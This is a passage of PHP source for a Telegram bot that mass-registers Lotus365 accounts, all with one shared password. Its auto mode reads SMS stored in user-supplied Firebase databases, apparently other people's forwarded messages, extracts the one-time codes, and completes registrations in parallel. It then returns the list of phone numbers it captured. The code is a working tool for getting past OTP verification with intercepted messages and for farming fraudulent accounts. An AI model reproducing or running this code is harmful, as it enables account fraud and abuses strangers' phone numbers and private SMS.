            $hs[$i] = buildLotusSendOtpHandle($term['devices'][$i]['phone']);
            curl_multi_add_handle($mh, $hs[$i]);
        }
        
        $active = null;
        do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.1); } while ($active && $mrc == CURLM_OK);
        
        $still_pending = [];
        foreach ($hs as $i => $ch) {
            $r = curl_multi_getcontent($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_multi_remove_handle($mh, $ch); curl_close($ch);
            $j = json_decode($r, true);
            
            if ($code == 200 && !empty($j['success'])) {
                $term['devices'][$i]['status'] = 'waiting_otp';
            } else {
                if ($try < 5) $still_pending[$i] = $attempt + 1;
                else {
                    $term['devices'][$i]['status'] = 'failed';
                    $term['devices'][$i]['error'] = 'OTP SEND FAIL';
                    $term['failed']++; $term['done']++;
                }
            }
        }
        curl_multi_close($mh);
        $pending_otp = $still_pending;
        setTerminalState($uid, $term);
        renderTerminal($uid, false, true);
    }

    // 2. PARALLEL OTP POLLING & FAST REGISTRATION (Max 30 Seconds)
    $waitStart = time();
    while ((time() - $waitStart) < 30) {  // 30 Sec Timeout
        $term = getTerminalState($uid);
        if (!empty($term['cancelled'])) break;

        $check_devices = [];
        foreach ($term['devices'] as $i => $dev) {
            if ($dev['status'] === 'waiting_otp') {
                $msgUrlBase = rtrim($dev['base_url'], '/') . '/messages/';
                $check_devices[$i] = $msgUrlBase . rawurlencode($dev['cid']) . '.json?orderBy=%22$key%22&limitToLast=' . FB_MSG_LIMIT;
            }
        }

        $newly_found = [];
        if (!empty($check_devices)) {
            $msgs_data = multiGetJson($check_devices, 4);
            foreach ($msgs_data as $i => $msgs) {
                if (is_array($msgs)) {
                    foreach ($msgs as $mid => $msg) {
                        if (!is_array($msg)) continue;
                        $body = $msg['body'] ?? $msg['text'] ?? $msg['message'] ?? $msg['msg'] ?? $msg['SMS'] ?? '';
                        if ($body === '') continue;
                        if (in_array((string)$mid, $term['devices'][$i]['baseline'])) continue;
                        $otp = extractLotusOtp((string)$body);
                        if ($otp) { 
                            $term['devices'][$i]['otp'] = $otp;
                            $term['devices'][$i]['status'] = 'registering';
                            $newly_found[$i] = $otp; 
                            break;
                        }
                    }
                }
            }
        }

        // 3. PARALLEL IMMEDIATE REGISTRATION
        if (!empty($newly_found)) {
            $mh = curl_multi_init(); $hs = [];
            foreach ($newly_found as $i => $otp) {
                $hs[$i] = buildLotusRegisterHandle($term['devices'][$i]['phone'], $otp);
                curl_multi_add_handle($mh, $hs[$i]);
            }
            
            $active = null;
            do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.1); } while ($active && $mrc == CURLM_OK);
            
            foreach ($hs as $i => $ch) {
                $r = curl_multi_getcontent($ch);
                curl_multi_remove_handle($mh, $ch); curl_close($ch);
                $j = json_decode($r, true);
                $userId = $j['data']['userid'] ?? null;
                
                if (!empty($userId)) {
                    $term['devices'][$i]['status'] = 'completed';
                    $term['devices'][$i]['userid'] = $userId;
                    $term['success']++;
                    saveAccount($uid, $term['devices'][$i]['phone'], $userId);
                    logAccount($term['devices'][$i]['phone'], $userId, $uid);
                } else {
                    $term['devices'][$i]['status'] = 'failed';
                    $term['devices'][$i]['error'] = 'REGISTER FAIL';
                    $term['failed']++;
                }
                $term['done']++;
            }
            curl_multi_close($mh);
            setTerminalState($uid, $term);
            renderTerminal($uid, false, true);
        }

        $all_done = true;
        foreach ($term['devices'] as $dev) {
            if ($dev['status'] === 'waiting_otp') { $all_done = false; break; }
        }
        if ($all_done) break;

        renderTerminal($uid, false, true);
        usleep(500000);
    }

    // Final timeout cleanup
    $term = getTerminalState($uid);
    foreach ($term['devices'] as $i => $dev) {
        if ($dev['status'] === 'waiting_otp') {
            $term['devices'][$i]['status'] = 'failed';
            $term['devices'][$i]['error'] = 'OTP TIMEOUT (30s)';
            $term['failed']++; $term['done']++;
        }
    }

    $term['completed'] = true;
    setTerminalState($uid, $term);
    renderTerminal($uid, true, true);

    $s = $term['success'] ?? 0; $f = $term['failed'] ?? 0; $t = $term['total'] ?? 0;
    
    // Send ONLY newly created accounts as file
    if ($s > 0) {
        $successful_phones = [];
        foreach ($term['devices'] as $d) {
            if ($d['status'] === 'completed') $successful_phones[] = $d['phone'];
        }
        if (!empty($successful_phones)) {
            $tmp_file = DATA_DIR . '/success_' . $uid . '_' . time() . '.txt';
            file_put_contents($tmp_file, implode("\n", $successful_phones) . "\n");
            sendDocument($chat_id, $tmp_file, "✅ <b>Successfully Registered Accounts</b> (" . count($successful_phones) . ")\n\nOnly the successes from this run are included here.");
            @unlink($tmp_file);
        }
    }
    
    send_premium($chat_id, [
        ['⭐', null], [$s > 0 ? " AUTO REGISTER COMPLETE\n" : " AUTO REGISTER FAILED\n", null],
        ["━━━━━━━━━━━━━━━━━━\n", null],
        ['📊', null], [" TOTAL CHECKED: $t\n", null],
        ['✅', null], [" SUCCESS: $s\n", null],
        ['❌', null], [" FAILED: $f\n", null],
        ['💼', null], [" TOTAL ACCOUNTS: " . getAccountCount($uid) . "\n\n", null],
        ['👇', null], [" USE 'MY ACCOUNTS' TO DOWNLOAD ALL", null],
    ], mainMenuKeyboard());
}

// ============================================================
// WEBHOOK ENTRY & HANDLERS
// ============================================================
if (!defined('BOT_LIB_ONLY')) {
    ensureSideMenuCommands();
    $input = file_get_contents('php://input');
    $update = json_decode($input, true);
    if (!$update) exit;
    try {
        if (isset($update['chat_member'])) handleChatMember($update['chat_member']);
        elseif (isset($update['callback_query'])) handleCallback($update['callback_query']);
        elseif (isset($update['message'])) handleMessage($update['message']);
    } catch (Throwable $e) { error_log('Bot err: ' . $e->getMessage()); }
}

function handleChatMember($cm) {
    $uid = $cm['new_chat_member']['user']['id'] ?? null;
    $st = $cm['new_chat_member']['status'] ?? '';
    if (!$uid) return;
    if (in_array($st, ['left','kicked'])) { setVerified($uid, false); clearState($uid); }
}

function handleCallback($cb) {
    $uid = $cb['from']['id'];
    $name = trim(($cb['from']['first_name'] ?? '') . ' ' . ($cb['from']['last_name'] ?? '')) ?: 'User';
    $username = $cb['from']['username'] ?? '';
    $data = $cb['data'] ?? '';
    $cb_id = $cb['id'];
    $chat_id = $cb['message']['chat']['id'];
    ensureUser($uid, $name, $username);

    if ($data === 'check_membership') {
        if (checkForceJoin($uid, true)) {
            tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'✅ Verified!','show_alert'=>false]);
            @tg('deleteMessage', ['chat_id'=>$chat_id,'message_id'=>$cb['message']['message_id']]);
            sendWelcome($chat_id, $uid, $name);
        } else {
            tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'⚠️ Channel join nahi kiya!','show_alert'=>false]);
        }
        return;
    }

    if (strpos($data, 'term_page:') === 0) {
        $target = (int)substr($data, 10);
        $s = getTerminalState($uid);
        if ($s) {
            $totalPages = count(computePages($s['total'] ?? 0));
            $target = max(0, min($totalPages-1, $target));
            setUserManualPage($uid, $target);
            $parts = terminalParts($s, $target, !empty($s['completed']) || !empty($s['cancelled']));
            $kb = terminalKeyboard($target, $totalPages, !empty($s['completed']) || !empty($s['cancelled']));
            edit_premium($chat_id, $cb['message']['message_id'], $parts, $kb);
        }
        tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'📄 Page ' . ($target+1),'show_alert'=>false]);
        return;
    }

    if ($data === 'term_cancel') {
        tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'🛑 Stopping...','show_alert'=>false]);
        $s = getTerminalState($uid);
        if ($s) { $s['cancelled'] = true; $s['completed'] = true; setTerminalState($uid, $s); renderTerminal($uid, true, true); }
        clearState($uid);
        send_premium($chat_id, [['❌', null], [' CANCELLED', null]], mainMenuKeyboard());
        return;
    }

    tg('answerCallbackQuery', ['callback_query_id'=>$cb_id]);
}

function handleMessage($msg) {
    $uid = $msg['from']['id'];
    $name = trim(($msg['from']['first_name'] ?? '') . ' ' . ($msg['from']['last_name'] ?? '')) ?: 'User';
    $username = $msg['from']['username'] ?? '';
    $chat_id = $msg['chat']['id'];
    $text = trim($msg['text'] ?? '');
    if ($text === '') return;

    if (preg_match('/^\/start/', $text)) { handleStart($uid, $name, $username, $chat_id); return; }

    ensureUser($uid, $name, $username);

    $settings = getSettings();
    if (!empty($settings['maintenance']) && $uid != ADMIN_ID) {
        send_premium($chat_id, [['🛠️', null], [' MAINTENANCE MODE', null]]);
        return;
    }

    $isMenuAction = in_array($text, [
        math_font('CREATE ACCOUNT'), 'CREATE ACCOUNT',
        math_font('AUTO MODE'), 'AUTO MODE',
        math_font('MY ACCOUNTS'), 'MY ACCOUNTS',
        math_font('CANCEL'), 'CANCEL',
        '/cancel', '/create', '/auto', '/accounts'
    ]);
    if (!checkForceJoin($uid, $isMenuAction)) {
        clearState($uid); sendJoinPrompt($chat_id); return;
    }

    if ($text === '/cancel' || mb_strtoupper($text, 'UTF-8') === 'CANCEL' || $text === math_font('CANCEL')) {
        $s = getTerminalState($uid);
        if ($s && empty($s['completed'])) { $s['cancelled'] = true; $s['completed'] = true; setTerminalState($uid, $s); renderTerminal($uid, true, true); }
        clearState($uid);
        send_premium($chat_id, [['❌', null], [' CANCELLED.', null]], mainMenuKeyboard());
        return;
    }

    $state = getState($uid);
    if ($state) {
        $step = $state['step'] ?? '';
        if ($step === 'awaiting_phone')  { handlePhoneInput($uid, $chat_id, $text); return; }
        if ($step === 'awaiting_otp')    { handleOtpInput($uid, $chat_id, $text); return; }
        if ($step === 'awaiting_fb_url') { handleFbUrlInput($uid, $chat_id, $text); return; }
    }

    if (in_array($text, ['/accounts', 'MY ACCOUNTS', math_font('MY ACCOUNTS')])) {
        clearState($uid); handleMyAccounts($uid, $chat_id); return;
    }
    if (in_array($text, ['/create', 'CREATE ACCOUNT', math_font('CREATE ACCOUNT')])) {
        handleCreateStart($uid, $chat_id); return;
    }
    if (in_array($text, ['/auto', 'AUTO MODE', math_font('AUTO MODE')])) {
        handleAutoStart($uid, $chat_id); return;
    }

    send_premium($chat_id, [['👇', null], [' USE THE BUTTONS BELOW.', null]], mainMenuKeyboard());
}

function handleStart($uid, $name, $username, $chat_id) {
    ensureUser($uid, $name, $username);
    if (!checkForceJoin($uid, true)) { sendJoinPrompt($chat_id); return; }
    sendWelcome($chat_id, $uid, $name);
}

function sendWelcome($chat_id, $uid, $name) {
    clearState($uid);
    $ac = getAccountCount($uid);
    $parts = [
        ['👋', null], [' WELCOME IMRAN9719 ⚡\n\n', null],
        ["━━━━━━━━━━━━━━━━━━\n\n", null],
        ['🤖', null], [' LOTUS365 AUTO REGISTER ', null],
        ['💼', null], [" YOUR ACCOUNTS: $ac\n", null],
        ['🔑', null], [" PASSWORD: ", null], [LOTUS_PASSWORD, null, 'code'],
        ["\n\n━━━━━━━━━━━━━━━━━━\n\n", null],
        ['👇', null], [' TAP BELOW TO START ', null],
    ];
    send_premium($chat_id, $parts, mainMenuKeyboard(), false);
}

function handleMyAccounts($uid, $chat_id) {
    $count = getAccountCount($uid);
    if ($count === 0) {
        send_premium($chat_id, [
            ['❌', null], [" NO ACCOUNTS YET\n\n", null],
            ['🚀', null], [" CREATE YOUR FIRST ACCOUNT", null],
        ], mainMenuKeyboard());
        return;
    }
    $f = accountsFile($uid);
    sendDocument($chat_id, $f, "📁 <b>Your Lotus365 Accounts ($count)</b>\n\nFormat: <b>Only Phone Numbers</b>\nPassword for all: <code>" . LOTUS_PASSWORD . "</code>");
}

function handleCreateStart($uid, $chat_id) {
    setState($uid, ['step'=>'awaiting_phone']);
    send_premium($chat_id, [
        ['🚀', null], [" CREATE LOTUS365 ACCOUNT\n\n", null],
        ["━━━━━━━━━━━━━━━━━━\n\n", null],
        ['📱', null], [" SEND YOUR 10-DIGIT PHONE NUMBER:\n\n", null],
        ['⭐', null], [" EXAMPLE: ", null], ['9876543210', null, 'code'],
        ["\n\n🔑 PASSWORD: ", null], [LOTUS_PASSWORD, null, 'code'],
    ], cancelKeyboard());
}

function handlePhoneInput($uid, $chat_id, $phone) {
    $phone = preg_replace('/\D/', '', $phone);
    if (!preg_match('/^[6-9]\d{9}$/', $phone)) {
        send_premium($chat_id, [['❌', null], [' INVALID NUMBER. SEND 10 DIGIT:', null]], cancelKeyboard());
        return;
    }
    if (isPhoneRegistered($uid, $phone)) {
        send_premium($chat_id, [
            ['⚠️', null], [" ALREADY REGISTERED\n\n", null],
            [" THIS NUMBER IS ALREADY IN YOUR ACCOUNTS FILE.", null]
        ], mainMenuKeyboard());
        clearState($uid);
        return;
    }

    send_premium($chat_id, [['⏳', null], [" SENDING OTP...", null]]);

    $ch = buildLotusSendOtpHandle($phone);
    $r = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    $j = json_decode($r, true);
    
    if ($code != 200 || empty($j['success'])) {
        send_premium($chat_id, [['❌', null], [' OTP SEND FAILED. TRY AGAIN.', null]], mainMenuKeyboard());
        clearState($uid);
        return;
    }
    setState($uid, ['step'=>'awaiting_otp', 'phone'=>$phone]);
    send_premium($chat_id, [
        ['✅', null], [" OTP SENT TO ", null], ['+91' . $phone, null, 'code'],
        ["\n\n⭐ ", null], [" ENTER OTP FROM SMS:\n", null],
        [' FORMAT: "Your OTP is XXXX"', null],
    ], cancelKeyboard());
}

function handleOtpInput($uid, $chat_id, $otp) {
    $state = getState($uid);
    if (!$state || empty($state['phone'])) {
        send_premium($chat_id, [['SESSION EXPIRED.', null]], mainMenuKeyboard()); return;
    }
    $otp = preg_replace('/\D/', '', $otp);
    if (!preg_match('/^\d{4,6}$/', $otp)) {
        send_premium($chat_id, [['❌', null], [' INVALID OTP. SEND 4-6 DIGITS.', null]], cancelKeyboard());
        return;
    }
    $phone = $state['phone'];
    send_premium($chat_id, [['🔄', null], [" REGISTERING...", null]]);

    $ch = buildLotusRegisterHandle($phone, $otp);
    $r = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    $j = json_decode($r, true);
    $userId = $j['data']['userid'] ?? null;
    
    clearState($uid);

    if (!empty($userId)) {
        saveAccount($uid, $phone, $userId);
        logAccount($phone, $userId, $uid);
        $ac = getAccountCount($uid);
        send_premium($chat_id, [
            ['✅', null], [" ACCOUNT CREATED!\n\n", null],
            ["━━━━━━━━━━━━━━━━━━\n", null],
            ['📱', null], [" PHONE: ", null], [$phone, null, 'code'], ["\n", null],
            ['🔑', null], [" PASSWORD: ", null], [LOTUS_PASSWORD, null, 'code'], ["\n", null],
            ['🆔', null], [" USER ID: ", null], [$userId, null, 'code'], ["\n", null],
            ["━━━━━━━━━━━━━━━━━━\n\n", null],
            ['💼', null], [" TOTAL ACCOUNTS: $ac\n\n", null],
            ['👇', null], [" USE 'MY ACCOUNTS' TO DOWNLOAD THE FILE (CONTAINS ONLY PHONE NUMBERS)", null],
        ], mainMenuKeyboard());
    } else {
        send_premium($chat_id, [
            ['❌', null], [" REGISTRATION FAILED\n\n", null],
            [' WRONG OTP OR EXPIRED. TRY /create AGAIN.', null]
        ], mainMenuKeyboard());
    }
}

function handleAutoStart($uid, $chat_id) {
    setState($uid, ['step'=>'awaiting_fb_url']);
    send_premium($chat_id, [
        ['⚙️', null], [" LOTUS365 AUTO REGISTER\n\n", null],
        ["━━━━━━━━━━━━━━━━━━\n\n", null],
        ['❓', null], [" HOW IT WORKS:\n", null],
        ["1. PASTE UP TO 10 FIREBASE URLs (NEW LINE)\n2. BOT SCANS 30s (LIVE)\n3. SENDS OTP (PARALLEL)\n4. READS OTP & REGISTERS FAST\n\n", null],
        ['🔗', null], [" PASTE FIREBASE URLs:", null],
    ], cancelKeyboard());
}

function handleFbUrlInput($uid, $chat_id, $text) {
    $raw_urls = preg_split('/\s+/', trim($text));
    $valid_urls = [];
    foreach ($raw_urls as $u) {
        $norm = normalizeFirebase($u);
        if ($norm) $valid_urls[] = $norm;
    }
    $valid_urls = array_unique($valid_urls);
    $valid_urls = array_slice($valid_urls, 0, 10); // Max 10 URLs
    
    if (empty($valid_urls)) {
        send_premium($chat_id, [['❌', null], [' INVALID FIREBASE URL. RETRY:', null]], cancelKeyboard());
        return;
    }
    clearState($uid);
    $scan = send_premium($chat_id, [
        ['🔍', null], [" DEEP SCANNING " . count($valid_urls) . " FIREBASE...\n\n", null],
        ["⏱ TIME REMAINING: 30s\n", null]
    ]);
    $scan_msg_id = $scan['result']['message_id'] ?? null;
    if (!spawnWorker($uid, $chat_id, $valid_urls, $scan_msg_id)) {
        send_premium($chat_id, [['⚠️', null], [' Worker spawn failed — running sync...', null]]);
        runAutoFlow($uid, $chat_id, $valid_urls, $scan_msg_id);
    }
}